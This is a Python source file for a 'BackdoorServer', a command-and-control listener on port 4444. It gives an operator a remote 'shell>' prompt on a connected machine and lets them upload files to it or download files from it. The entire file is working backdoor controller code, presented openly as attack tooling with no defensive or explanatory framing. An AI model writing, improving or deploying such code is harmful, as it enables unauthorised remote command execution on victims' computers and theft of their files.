import socket
import os

class BackdoorServer:
    def __init__(self, host='127.0.0.1', port=4444):
        self.host = host
        self.port = port
        self.buffer_size = 4096
        self.tmp_buffer_size = 1024 * 1024 

    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server.bind((self.host, self.port))
            server.listen(1)
            print(f"[*] Listening on {self.host}:{self.port}")

            while True:
                client_socket, address = server.accept()
                print(f"[+] Connection established from {address[0]}:{address[1]}")
                self.handle_client(client_socket)
                
        except Exception as e:
            print(f"[!] Error: {str(e)}")
        finally:
            server.close()

    def receive_all(self, client_socket):
        data = bytearray()
        while True:
            chunk = client_socket.recv(self.buffer_size)
            data.extend(chunk)
            if len(chunk) < self.buffer_size:
                break
        return data

    def send_file(self, client_socket, filepath):
        try:
            if not os.path.exists(filepath):
                return "[!] File not found"

            file_size = os.path.getsize(filepath)
            client_socket.send(str(file_size).encode())
            
            client_socket.recv(self.buffer_size)  # Wait for ready signal
            
            with open(filepath, 'rb') as f:
                data = f.read()
                client_socket.send(data)
            return "[+] File sent successfully"
        except Exception as e:
            return f"[!] Error sending file: {str(e)}"

    def receive_file(self, client_socket, filepath):
        try:
            file_size = int(client_socket.recv(self.buffer_size).decode())
            client_socket.send("Ready".encode())
            
            received_data = b""
            while len(received_data) < file_size:
                data = client_socket.recv(self.buffer_size)
                if not data:
                    break
                received_data += data

            with open(filepath, 'wb') as f:
                f.write(received_data)
            return "[+] File received successfully"
        except Exception as e:
            return f"[!] Error receiving file: {str(e)}"

    def handle_client(self, client_socket):
        try:
            while True:
                command = input("shell> ")
                if not command.strip():
                    continue

                client_socket.send(command.encode())

                if command.lower() == 'exit':
                    break

                if command.startswith('upload'):
                    _, filepath = command.split(' ')
                    response = self.send_file(client_socket, filepath)
                elif command.startswith('download'):
                    _, filepath = command.split(' ')
                    response = self.receive_file(client_socket, filepath)
                else:
                    response = self.receive_all(client_socket).decode()
                
                print(response)

        except Exception as e:
            print(f"[!] Error: {str(e)}")
        finally:
            client_socket.close()

if __name__ == "__main__":
    server = BackdoorServer()
    server.start()